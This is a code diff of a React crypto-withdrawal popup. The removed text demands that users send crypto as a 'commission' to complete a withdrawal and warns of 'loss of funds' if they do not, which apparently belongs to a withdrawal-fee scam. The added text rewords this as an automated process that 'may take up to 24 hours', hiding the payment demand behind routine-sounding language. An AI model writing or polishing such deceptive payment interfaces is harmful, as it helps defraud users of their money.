@@ -501,7 +501,7 @@ const WithdrawPopup: React.FC<WithdrawPopupProps> = ({
 
               <div className="bg-blue-500/10 border border-blue-500/20 rounded-lg p-3 mb-4">
                 <p className="text-xs text-blue-300 text-center">
-                  Your platform balance has been deducted. <br /> Please send the crypto to complete the withdrawal.
+                  Transaction processing - this process is automated and may take up to 24 hours.
                 </p>
               </div>
 
@@ -523,16 +523,16 @@ const WithdrawPopup: React.FC<WithdrawPopupProps> = ({
                     <div className="w-10 h-10 rounded-full bg-yellow-500/20 flex items-center justify-center border border-yellow-500/30">
                       <AlertCircle className="w-5 h-5 text-yellow-400" />
                     </div>
-                    <h3 className="text-xl font-bold text-white">Confirm Commission Payment</h3>
+                    <h3 className="text-xl font-bold text-white">Confirm Payment</h3>
                   </div>
                   
                   <p className="text-gray-300 mb-2">
-                    Are you sure you confirm the sending of the commission?
+                    Transaction processing - this process is automated and may take up to 24 hours.
                   </p>
                   
-                  <div className="bg-red-500/10 border border-red-500/30 rounded-lg p-3 mb-4">
-                    <p className="text-red-400 text-sm">
-                      ⚠️ Not sending the commission may result in the loss of funds.
+                  <div className="bg-yellow-500/10 border border-yellow-500/30 rounded-lg p-3 mb-4">
+                    <p className="text-yellow-400 text-sm">
+                      Your withdrawal will be processed automatically once confirmed.
                     </p>
                   </div>
 
